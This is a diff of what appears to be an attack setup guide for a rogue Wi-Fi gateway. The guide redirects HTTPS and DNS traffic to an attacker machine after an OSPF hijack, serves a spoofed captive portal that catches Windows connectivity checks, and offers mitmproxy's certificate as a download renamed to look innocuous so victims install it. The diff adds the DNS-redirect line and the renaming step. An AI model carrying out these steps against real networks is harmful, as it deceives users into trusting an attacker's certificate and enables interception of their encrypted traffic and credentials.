@@ -283,15 +283,15 @@ sudo sed -i '#net.ipv4.ip_forward=1' 'net.ipv4.ip_forward=1'
 
 # Check that only wlan0 has default route (delete default route for eth0 if exists)
 ip route
-
 sudo ip route del default via <ip_addr> dev eth0 proto static metric <metric value>
 
-# Configure IPTABLE
-sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
+# Configure IPTABLE (Removed prerouting for port 80 to 8080 - interferes with captiveportal)
 sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
 sudo iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
 sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
 sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+# Redirect DNS traffic to Attacker machine (after OSPF Hijack successful)
+sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 # Check IPTABLE
 sudo iptables -t nat -L -v -n
 ```
@@ -396,9 +396,6 @@ sudo vim /etc/apache2/site-enabled/000-default.conf
 #Add `FallbackResource /index.html` <- this will cause HTTP request to msftconnecttest.com/redirect to our index.html
 
 ### Add custom generated certificate into index.html as a downloadable link
-
-# Redirect DNS traffic to Attacker machine (after OSPF Hijack successful)
-sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 ```
 
 # MITMPROXY SETUP
@@ -408,7 +405,7 @@ mitmproxy
 
 # Cert files will be generated under ~/.mitmproxy
 place `.cer` certfile as download link in spoofed captive portal
-rename certfile too
+rename certfile to non suspicious name
 ```
 
 # Users install 
